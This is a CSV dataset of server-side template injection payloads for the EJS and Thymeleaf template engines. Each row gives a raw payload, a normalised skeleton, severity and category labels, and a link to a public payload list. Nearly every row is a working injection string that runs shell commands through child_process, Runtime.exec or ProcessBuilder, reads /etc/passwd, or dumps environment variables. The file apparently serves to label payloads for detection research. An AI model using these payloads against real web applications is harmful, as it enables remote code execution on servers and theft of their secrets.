"<%= process.mainModule.require('child_process').spawnSync('sh',['-c','cat</etc/passwd']).stdout.toString() %>","<%=process.mainmodule.require('S').spawnsync('S',['S','S']).stdout.tostring()%>",javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%= process.mainModule.require('child_process').spawnSync('sh',['-c','cat<flag.txt']).stdout.toString() %>","<%=process.mainmodule.require('S').spawnsync('S',['S','S']).stdout.tostring()%>",javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').execSync('calc').toString() %>,<%=process.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').execSync('cmd /c calc').toString() %>,<%=process.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').execSync('cmd /c dir').toString() %>,<%=process.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').execSync('powershell.exe').toString() %>,<%=process.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('child_process').execSync('cmd.exe /c whoami').toString() %>,<%=process.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%= process.mainModule.require('child_process').spawnSync('cmd',['/c','whoami']).stdout.toString() %>","<%=process.mainmodule.require('S').spawnsync('S',['S','S']).stdout.tostring()%>",javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%= process.mainModule.require('child_process').spawnSync('powershell',['-c','whoami']).stdout.toString() %>","<%=process.mainmodule.require('S').spawnsync('S',['S','S']).stdout.tostring()%>",javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= require('child_process').execSync('cmd /c whoami').toString() %>,<%=require('S').execsync('S').tostring()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= require('child_process').execSync('powershell -c whoami').toString() %>,<%=require('S').execsync('S').tostring()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('net').isIP('127.0.0.1') %>,<%=process.mainmodule.require('S').isip('S')%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('dns').lookup('localhost') %>,<%=process.mainmodule.require('S').lookup('S')%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('http').request %>,<%=process.mainmodule.require('S').request%>,javascript,EJS,1,high,enumeration,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('https').request %>,<%=process.mainmodule.require('S').request%>,javascript,EJS,1,high,enumeration,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('url').parse('http://example.com') %>,<%=process.mainmodule.require('S').parse('S')%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('path').resolve('/') %>,<%=process.mainmodule.require('S').resolve('S')%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('path').dirname('/etc/passwd') %>,<%=process.mainmodule.require('S').dirname('S')%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('crypto').getHashes() %>,<%=process.mainmodule.require('S').gethashes()%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('crypto').getCiphers() %>,<%=process.mainmodule.require('S').getciphers()%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('util').inspect(process) %>,<%=process.mainmodule.require('S').inspect(process)%>,javascript,EJS,1,high,uncertain,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('util').inspect(global) %>,<%=process.mainmodule.require('S').inspect(global)%>,javascript,EJS,1,high,uncertain,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= process.mainModule.require('util').inspect(process.env) %>,<%=process.mainmodule.require('S').inspect(process.env)%>,javascript,EJS,1,high,uncertain,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= Function('return this')() %>,<%=function('S')()%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= Function('return process')() %>,<%=function('S')()%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= Function('return global')() %>,<%=function('S')()%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%= Function('return process.mainModule.require(""child_process"").execSync(""id"").toString()')() %>",<%=function('S')()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%= Function('return process.mainModule.require(""child_process"").execSync(""whoami"").toString()')() %>",<%=function('S')()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%= Function('return process.mainModule.require(""child_process"").execSync(""cat /etc/passwd"").toString()')() %>",<%=function('S')()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%= Function('return process.mainModule.require(""fs"").readFileSync(""/etc/passwd"",""utf8"")')() %>",<%=function('S')()%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= constructor.constructor('return process')() %>,<%=constructor.constructor('S')()%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= constructor.constructor('return global')() %>,<%=constructor.constructor('S')()%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%= constructor.constructor('return process.mainModule.require(""child_process"").execSync(""id"").toString()')() %>",<%=constructor.constructor('S')()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%= constructor.constructor('return process.mainModule.require(""child_process"").execSync(""whoami"").toString()')() %>",<%=constructor.constructor('S')()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%= constructor.constructor('return process.mainModule.require(""fs"").readFileSync(""/etc/passwd"",""utf8"")')() %>",<%=constructor.constructor('S')()%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%- Function('return process.mainModule.require(""child_process"").execSync(""id"").toString()')() %>",<%-function('S')()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%- Function('return process.mainModule.require(""child_process"").execSync(""whoami"").toString()')() %>",<%-function('S')()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%- constructor.constructor('return process.mainModule.require(""child_process"").execSync(""id"").toString()')() %>",<%-constructor.constructor('S')()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<% return process.mainModule.require('child_process').execSync('id').toString() %>,<%returnprocess.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<% return process.mainModule.require('child_process').execSync('whoami').toString() %>,<%returnprocess.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<% return process.mainModule.require('child_process').execSync('cat /etc/passwd').toString() %>,<%returnprocess.mainmodule.require('S').execsync('S').tostring()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<% return process.mainModule.require('fs').readFileSync('/etc/passwd','utf8') %>","<%returnprocess.mainmodule.require('S').readfilesync('S','S')%>",javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%=JSON.stringify(process.env)%>,<%=json.stringify(process.env)%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%=JSON.stringify(process.versions)%>,<%=json.stringify(process.versions)%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%=JSON.stringify(process.config)%>,<%=json.stringify(process.config)%>,javascript,EJS,1,high,enumeration,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%=JSON.stringify(process.mainModule)%>,<%=json.stringify(process.mainmodule)%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%=Object.keys(process)%>,<%=object.keys(process)%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%=Object.keys(global)%>,<%=object.keys(global)%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%=Object.getOwnPropertyNames(process)%>,<%=object.getownpropertynames(process)%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%=Object.getOwnPropertyNames(global)%>,<%=object.getownpropertynames(global)%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= this %>,<%=this%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= this.process %>,<%=this.process%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= this.global %>,<%=this.global%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= this.constructor %>,<%=this.constructor%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= this.constructor.constructor('return process')() %>,<%=this.constructor.constructor('S')()%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
<%= this.constructor.constructor('return global')() %>,<%=this.constructor.constructor('S')()%>,javascript,EJS,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
"<%= this.constructor.constructor('return process.mainModule.require(""child_process"").execSync(""id"").toString()')() %>",<%=this.constructor.constructor('S')()%>,javascript,EJS,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/ejs.txt
${T(java.lang.Runtime).getRuntime().exec('whoami')},${t(java.lang.runtime).getruntime().exec('S')},java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.Runtime).getRuntime().exec('uname -a')},${t(java.lang.runtime).getruntime().exec('S')},java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.Runtime).getRuntime().exec('pwd')},${t(java.lang.runtime).getruntime().exec('S')},java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.Runtime).getRuntime().exec('env')},${t(java.lang.runtime).getruntime().exec('S')},java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${T(java.lang.Runtime).getRuntime().exec(new String[]{'sh','-c','whoami'})}","${t(java.lang.runtime).getruntime().exec(newstring[]{'S','S','S'})}",java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${T(java.lang.Runtime).getRuntime().exec(new String[]{'sh','-c','cat /etc/passwd'})}","${t(java.lang.runtime).getruntime().exec(newstring[]{'S','S','S'})}",java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${T(java.lang.Runtime).getRuntime().exec(new String[]{'bash','-c','id'})}","${t(java.lang.runtime).getruntime().exec(newstring[]{'S','S','S'})}",java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${T(java.lang.Runtime).getRuntime().exec(new String[]{'/bin/sh','-c','id'})}","${t(java.lang.runtime).getruntime().exec(newstring[]{'S','S','S'})}",java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${T(java.lang.Runtime).getRuntime().exec(new String[]{'/bin/bash','-c','id'})}","${t(java.lang.runtime).getruntime().exec(newstring[]{'S','S','S'})}",java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.String).getClass().forName('java.lang.Runtime').getRuntime().exec('id')},${t(java.lang.string).getclass().forname('S').getruntime().exec('S')},java,Thymeleaf,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${T(java.lang.String).getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('id')}","${t(java.lang.string).getclass().forname('S').getmethod('S',null).invoke(null,null).exec('S')}",java,Thymeleaf,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.System).getProperty('user.name')},${t(java.lang.system).getproperty('S')},java,Thymeleaf,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.System).getProperty('user.home')},${t(java.lang.system).getproperty('S')},java,Thymeleaf,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.System).getProperty('os.version')},${t(java.lang.system).getproperty('S')},java,Thymeleaf,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.System).getProperty('os.arch')},${t(java.lang.system).getproperty('S')},java,Thymeleaf,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.System).getProperty('java.version')},${t(java.lang.system).getproperty('S')},java,Thymeleaf,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.System).getProperty('java.home')},${t(java.lang.system).getproperty('S')},java,Thymeleaf,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.System).getProperty('java.class.path')},${t(java.lang.system).getproperty('S')},java,Thymeleaf,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.System).getenv('PATH')},${t(java.lang.system).getenv('S')},java,Thymeleaf,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.System).getenv('HOME')},${t(java.lang.system).getenv('S')},java,Thymeleaf,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.System).getenv('USER')},${t(java.lang.system).getenv('S')},java,Thymeleaf,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.System).getenv('SHELL')},${t(java.lang.system).getenv('S')},java,Thymeleaf,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.ProcessBuilder).start()},${t(java.lang.processbuilder).start()},java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${new java.lang.ProcessBuilder('id').start()},${newjava.lang.processbuilder('S').start()},java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${new java.lang.ProcessBuilder('whoami').start()},${newjava.lang.processbuilder('S').start()},java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${new java.lang.ProcessBuilder('cat','/etc/passwd').start()}","${newjava.lang.processbuilder('S','S').start()}",java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${new java.lang.ProcessBuilder('ls','-la').start()}","${newjava.lang.processbuilder('S','S').start()}",java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${new java.lang.ProcessBuilder('uname','-a').start()}","${newjava.lang.processbuilder('S','S').start()}",java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${new java.lang.ProcessBuilder('bash','-c','id').start()}","${newjava.lang.processbuilder('S','S','S').start()}",java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${new java.lang.ProcessBuilder('sh','-c','id').start()}","${newjava.lang.processbuilder('S','S','S').start()}",java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${new java.lang.ProcessBuilder('/bin/sh','-c','id').start()}","${newjava.lang.processbuilder('S','S','S').start()}",java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${new java.lang.ProcessBuilder('/bin/bash','-c','id').start()}","${newjava.lang.processbuilder('S','S','S').start()}",java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${new java.lang.ProcessBuilder(new String[]{'sh','-c','id'}).start()}","${newjava.lang.processbuilder(newstring[]{'S','S','S'}).start()}",java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.Class).forName('java.lang.Runtime').getRuntime().exec('id')},${t(java.lang.class).forname('S').getruntime().exec('S')},java,Thymeleaf,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${T(java.lang.Class).forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('id')}","${t(java.lang.class).forname('S').getmethod('S',null).invoke(null,null).exec('S')}",java,Thymeleaf,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(java.lang.Class).forName('java.lang.ProcessBuilder').getDeclaredConstructors()[0].newInstance('id').start()},${t(java.lang.class).forname('S').getdeclaredconstructors()[N].newinstance('S').start()},java,Thymeleaf,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())},${t(org.apache.commons.io.ioutils).tostring(t(java.lang.runtime).getruntime().exec('S').getinputstream())},java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd').getInputStream())},${t(org.apache.commons.io.ioutils).tostring(t(java.lang.runtime).getruntime().exec('S').getinputstream())},java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(new String[]{'sh','-c','id'}).getInputStream())}","${t(org.apache.commons.io.ioutils).tostring(t(java.lang.runtime).getruntime().exec(newstring[]{'S','S','S'}).getinputstream())}",java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
"${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(new String[]{'bash','-c','id'}).getInputStream())}","${t(org.apache.commons.io.ioutils).tostring(t(java.lang.runtime).getruntime().exec(newstring[]{'S','S','S'}).getinputstream())}",java,Thymeleaf,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/thymeleaf.txt
